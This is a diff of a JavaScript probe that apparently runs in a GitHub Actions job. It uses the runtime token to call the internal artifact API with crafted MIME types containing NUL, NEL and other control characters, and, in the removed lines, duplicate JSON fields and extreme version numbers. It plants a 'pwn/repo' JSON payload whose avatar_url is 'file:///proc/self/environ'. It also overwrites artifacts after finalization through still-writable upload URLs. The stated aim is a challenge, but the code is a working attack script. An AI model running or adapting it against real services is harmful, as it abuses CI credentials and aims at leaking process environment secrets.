@@ -9,145 +9,110 @@ const endpoint = new URL(
   '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
   process.env.ACTIONS_RESULTS_URL,
 );
-const token = process.env.ACTIONS_RUNTIME_TOKEN;
-const weird = 'application/json\u0085';
+const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
+const client = internalArtifactTwirpClient({maxAttempts: 1});
+const storedMime = 'application/json\u0085';
 const body = Buffer.from(JSON.stringify({
   full_name: 'pwn/repo',
   owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
-  description: 'Repo Cassette duplicate-field carrier',
+  description: 'Repo Cassette MIME boundary carrier',
   stargazers_count: 0,
 }));
 const digest = createHash('sha256').update(body).digest('hex');
-const client = internalArtifactTwirpClient({maxAttempts: 1});
 
-function quoted(value) {
-  return JSON.stringify(value);
-}
-
-async function rawCreate(name, fields) {
-  const raw = '{' +
-    '"workflow_run_backend_id":' + quoted(ids.workflowRunBackendId) + ',' +
-    '"workflow_job_run_backend_id":' + quoted(ids.workflowJobRunBackendId) + ',' +
-    '"name":' + quoted(name) + ',' + fields + '}';
+async function create(name, mimeType) {
   const response = await fetch(endpoint, {
     method: 'POST',
     headers: {
-      authorization: `Bearer ${token}`,
+      authorization: `Bearer ${runtimeToken}`,
       'content-type': 'application/json',
     },
-    body: raw,
+    body: JSON.stringify({
+      workflow_run_backend_id: ids.workflowRunBackendId,
+      workflow_job_run_backend_id: ids.workflowJobRunBackendId,
+      name,
+      version: 7,
+      mime_type: mimeType,
+    }),
   });
   const text = await response.text();
-  let result = {};
-  try { result = JSON.parse(text); } catch {}
-  return {
-    status: response.status,
-    text,
-    signedUploadUrl: result.signed_upload_url || result.signedUploadUrl || '',
-    ok: result.ok,
-  };
+  let value = {};
+  try { value = JSON.parse(text); } catch {}
+  return {status: response.status, text, value};
 }
 
-async function publish(name, signedUploadUrl) {
-  const blob = new BlobClient(signedUploadUrl).getBlockBlobClient();
-  await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: weird}});
-  const result = await client.FinalizeArtifact({
+async function publish(name, uploadUrl) {
+  const blob = new BlobClient(uploadUrl).getBlockBlobClient();
+  await blob.uploadData(body, {
+    blobHTTPHeaders: {blobContentType: storedMime},
+  });
+  const finalized = await client.FinalizeArtifact({
     workflowRunBackendId: ids.workflowRunBackendId,
     workflowJobRunBackendId: ids.workflowJobRunBackendId,
     name,
     size: String(body.length),
     hash: StringValue.create({value: `sha256:${digest}`}),
   });
-  await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: weird}});
-  return String(result.artifactId);
+
+  // Upload URLs stay writable after finalization, so ensure the raw bytes and
+  // underlying Azure MIME metadata are exactly what the challenge needs.
+  await blob.uploadData(body, {
+    blobHTTPHeaders: {blobContentType: storedMime},
+  });
+
+  const download = await client.GetSignedArtifactURL({
+    workflowRunBackendId: ids.workflowRunBackendId,
+    workflowJobRunBackendId: ids.workflowJobRunBackendId,
+    name,
+  });
+  const response = await fetch(download.signedUrl);
+  const bytes = Buffer.from(await response.arrayBuffer());
+  const contentType = response.headers.get('content-type') || '';
+  const url = new URL(download.signedUrl);
+  return {
+    artifactId: String(finalized.artifactId),
+    downloadStatus: response.status,
+    contentTypeHex: Buffer.from(contentType, 'latin1').toString('hex'),
+    contentTypeJson: JSON.stringify(contentType),
+    responseBytes: bytes.length,
+    responseSha256: createHash('sha256').update(bytes).digest('hex'),
+    rsct: url.searchParams.get('rsct'),
+  };
 }
 
 const cases = [
-  ['control-v7', '"version":7,"mime_type":"application/json"'],
-  ['control-v6', `"version":6,"mime_type":${quoted(weird)}`],
-  ['version-minus-one',
-    `"version":-1,"mime_type":${quoted(weird)}`],
-  ['version-minus-two',
-    `"version":-2,"mime_type":${quoted(weird)}`],
-  ['version-int-min',
-    `"version":-2147483648,"mime_type":${quoted(weird)}`],
-  ['version-int-max',
-    `"version":2147483647,"mime_type":${quoted(weird)}`],
-  ['version-seven-null-mime', '"version":7,"mime_type":null'],
-  ['version-seven-no-mime', '"version":7'],
-  ['mime-valid-weird',
-    `"version":7,"mime_type":"application/json","mime_type":${quoted(weird)}`],
-  ['mime-weird-valid',
-    `"version":7,"mime_type":${quoted(weird)},"mime_type":"application/json"`],
-  ['mime-snake-camel',
-    `"version":7,"mime_type":"application/json","mimeType":${quoted(weird)}`],
-  ['mime-camel-snake',
-    `"version":7,"mimeType":${quoted(weird)},"mime_type":"application/json"`],
-  ['version-seven-six',
-    `"version":7,"version":6,"mime_type":${quoted(weird)}`],
-  ['version-six-seven',
-    `"version":6,"version":7,"mime_type":${quoted(weird)}`],
-  ['escaped-key-valid-weird',
-    `"version":7,"mime_type":"application/json","mime_\\u0074ype":${quoted(weird)}`],
-  ['escaped-key-weird-valid',
-    `"version":7,"mime_\\u0074ype":${quoted(weird)},"mime_type":"application/json"`],
+  ['control', 'application/json'],
+  ['nul-end', 'application/json\u0000'],
+  ['nul-nel-end', 'application/json\u0000\u0085'],
+  ['nul-x-nel', 'application/json\u0000x\u0085'],
+  ['nel-nul-end', 'application/json\u0085\u0000'],
+  ['nul-prefix', '\u0000application/json'],
+  ['nul-prefix-nel', '\u0000application/json\u0085'],
+  ['double-nul-nel', 'application/json\u0000\u0000\u0085'],
+  ['del-end', 'application/json\u007f'],
+  ['c1-80-end', 'application/json\u0080'],
+  ['c1-9f-end', 'application/json\u009f'],
+  ['dot-end', 'application/json.'],
+  ['dash-end', 'application/json-'],
+  ['plus-end', 'application/json+'],
+  ['star-end', 'application/json*'],
 ];
 
-const report = [];
-for (const [label, fields] of cases) {
-  const name = `wire-${process.env.GITHUB_RUN_ID}-${label}`;
+for (const [label, mimeType] of cases) {
+  const name = `nul-${process.env.GITHUB_RUN_ID}-${label}`;
+  const item = {
+    label,
+    requestedMimeHex: Buffer.from(mimeType, 'latin1').toString('hex'),
+  };
   try {
-    const created = await rawCreate(name, fields);
-    const item = {
-      label,
-      status: created.status,
-      ok: created.ok,
-      response: created.text.slice(0, 220),
-    };
-    if (created.signedUploadUrl) {
-      item.path = new URL(created.signedUploadUrl).pathname.split('.').at(-1);
-      item.artifactId = await publish(name, created.signedUploadUrl);
-    }
-    report.push(item);
-    console.log(`WIRE ${JSON.stringify(item)}`);
+    const created = await create(name, mimeType);
+    item.createStatus = created.status;
+    item.createBody = created.text.slice(0, 240);
+    const uploadUrl = created.value.signed_upload_url ||
+      created.value.signedUploadUrl;
+    if (uploadUrl) Object.assign(item, await publish(name, uploadUrl));
   } catch (error) {
-    const item = {label, error: String(error).slice(0, 300)};
-    report.push(item);
-    console.log(`WIRE ${JSON.stringify(item)}`);
+    item.error = String(error).slice(0, 400);
   }
-}
-console.log(`WIRE_REPORT ${JSON.stringify(report)}`);
-
-const mutationCases = [
-  ['missing', '"version":7'],
-  ['null', '"version":7,"mime_type":null'],
-  ['invalid', `"version":7,"mime_type":${quoted(weird)}`],
-  ['valid', '"version":7,"mime_type":"application/json"'],
-  ['version-eight', '"version":8,"mime_type":"application/json"'],
-];
-for (const [label, fields] of mutationCases) {
-  const name = `mutate-${process.env.GITHUB_RUN_ID}-${label}`;
-  try {
-    const original = await client.CreateArtifact({
-      workflowRunBackendId: ids.workflowRunBackendId,
-      workflowJobRunBackendId: ids.workflowJobRunBackendId,
-      name,
-      version: 6,
-      mimeType: StringValue.create({value: weird}),
-    });
-    const mutation = await rawCreate(name, fields);
-    const artifactId = await publish(name, original.signedUploadUrl);
-    console.log(`MUTATION ${JSON.stringify({
-      label,
-      mutationStatus: mutation.status,
-      mutationOk: mutation.ok,
-      mutationResponse: mutation.text.slice(0, 180),
-      originalPath: new URL(original.signedUploadUrl).pathname.split('.').at(-1),
-      mutationPath: mutation.signedUploadUrl
-        ? new URL(mutation.signedUploadUrl).pathname.split('.').at(-1) : null,
-      artifactId,
-    })}`);
-  } catch (error) {
-    console.log(`MUTATION ${JSON.stringify({label, error: String(error).slice(0, 300)})}`);
-  }
+  console.log(`MIME_PROBE ${JSON.stringify(item)}`);
 }
